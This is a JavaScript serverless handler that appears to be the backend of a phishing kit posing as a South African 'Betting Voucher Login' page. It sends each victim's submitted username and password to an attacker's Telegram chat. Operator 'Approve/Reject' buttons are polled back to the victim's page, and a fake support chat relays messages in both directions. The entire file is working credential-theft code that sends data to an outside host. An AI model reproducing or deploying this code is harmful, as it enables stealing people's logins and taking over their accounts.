export default async function handler(req) {
  // Handle CORS Preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  const T_TOK = process.env.TELEGRAM_TOKEN;
  const C_ID = process.env.CHAT_ID;
  
  const url = new URL(req.url);
  const action = url.searchParams.get('action');

  // 1. HANDLE GET REQUESTS (Polling)
  if (req.method === 'GET') {
    if (action === 'getUpdates') {
      const clientMsgId = parseInt(url.searchParams.get('messageId'));
      
      if (!clientMsgId) {
        return new Response(JSON.stringify({ action: "none" }), { status: 200, headers: { 'Content-Type': 'application/json' } });
      }

      try {
        const response = await fetch(`https://api.telegram.org/bot${T_TOK}/getUpdates?offset=-1`);
        const d = await response.json();
        const last = d.result?.[0];
        
        if (last?.callback_query) {
          const cb = last.callback_query;
          if (cb.message.message_id === clientMsgId) {
            return new Response(JSON.stringify({ action: cb.data }), { status: 200, headers: { 'Content-Type': 'application/json' } });
          }
        }
      } catch (e) {
        console.error("Polling Error: ", e.message);
      }
      return new Response(JSON.stringify({ action: "none" }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }

    if (action === 'getChatUpdates') {
      try {
        const response = await fetch(`https://api.telegram.org/bot${T_TOK}/getUpdates?offset=-1`);
        const d = await response.json();
        const m = d.result?.[0]?.message;
        
        if (m && m.reply_to_message && m.text) {
          return new Response(JSON.stringify({ text: m.text, message_id: m.message_id }), { status: 200, headers: { 'Content-Type': 'application/json' } });
        }
      } catch (e) {
        console.error("Chat Polling Error: ", e.message);
      }
      return new Response(JSON.stringify({ text: null }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }
  }

  // 2. HANDLE POST REQUESTS
  if (req.method === 'POST') {
    let body;
    try {
      body = await req.json();
    } catch (e) {
      return new Response('Missing Request Body', { status: 400 });
    }

    if (body.action === 'login') {
      const messageText = `📱 <b>Betting Voucher Login SA 🇿🇦</b>\n👤 <b>User:</b> <code>${body.user}</code>\n🔑 <b>Pass:</b> <code>${body.pass}</code>`;
      const kb = { 
        inline_keyboard: [[
          { text: "✅ Approve", callback_data: "approve" }, 
          { text: "❌ Reject", callback_data: "reject" }
        ]] 
      };
      
      try {
        const res = await fetch(`https://api.telegram.org/bot${T_TOK}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: C_ID,
            text: messageText,
            parse_mode: 'HTML',
            reply_markup: kb
          })
        });
        const data = await res.json();
        
        if (data.ok) {
          return new Response(JSON.stringify({ success: true, messageId: data.result.message_id }), { status: 200, headers: { 'Content-Type': 'application/json' } });
        }
        return new Response(JSON.stringify({ error: "Telegram API reject", details: data }), { status: 400, headers: { 'Content-Type': 'application/json' } });
      } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { 'Content-Type': 'application/json' } });
      }
    }

    if (body.action === 'sendChat') {
      try {
        const chatText = `💬 Support [${body.user}]: ${body.text}`;
        await fetch(`https://api.telegram.org/bot${T_TOK}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: C_ID,
            text: chatText
          })
        });
        return new Response(JSON.stringify({ success: true }), { status: 200, headers: { 'Content-Type': 'application/json' } });
      } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { 'Content-Type': 'application/json' } });
      }
    }
  }

  return new Response('Method Not Allowed', { status: 405 });
}